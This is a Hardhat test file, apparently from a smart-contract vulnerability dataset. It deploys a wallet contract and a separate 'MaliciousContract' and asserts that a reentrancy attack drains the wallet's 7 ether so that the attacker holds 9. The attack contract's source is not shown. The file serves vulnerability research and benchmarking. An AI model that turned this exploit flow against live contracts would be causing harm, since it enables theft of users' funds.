const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol", function () {
  let W_WALLET;
  let w_WALLET;
  let MaliciousContract;
  let maliciousContract;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol:Log");
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy w_WALLET contract with Log address
    W_WALLET = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol:W_WALLET");
    w_WALLET = await W_WALLET.deploy(log.target);
    await w_WALLET.waitForDeployment();
    //await w_WALLET.setLog(log.target); // Set Log address after deployment
 
    // Deploy MaliciousContract with W_WALLET address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3_attack.sol:MaliciousContract");
    maliciousContract = await MaliciousContract.deploy(w_WALLET.target);
    
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to W_WALLET contract
    await w_WALLET.Put( 1, {value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(w_WALLET.target);
    expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from maliciousContract on W_WALLET contract
    await maliciousContract.deposit({value:  ethers.parseEther("2")});

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(w_WALLET.target);
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 


    // Perform reentrancy attack through MaliciousContract
    await maliciousContract.attack({value:  ethers.parseEther("2")});
    
    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(w_WALLET.target);
    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);

    // Verify the attack was successful
    
    // w_WALLET has a drained account
    expect(victimBalance).to.equal(ethers.parseEther("0")); 

    // 5 original balance + 2 from attacker initial deposit 
    expect(maliciousContractBalance).to.equal(ethers.parseEther("9"));
    
  });
});
